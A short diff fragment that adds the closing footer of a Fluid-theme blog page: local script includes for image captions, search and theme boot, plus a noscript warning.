+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
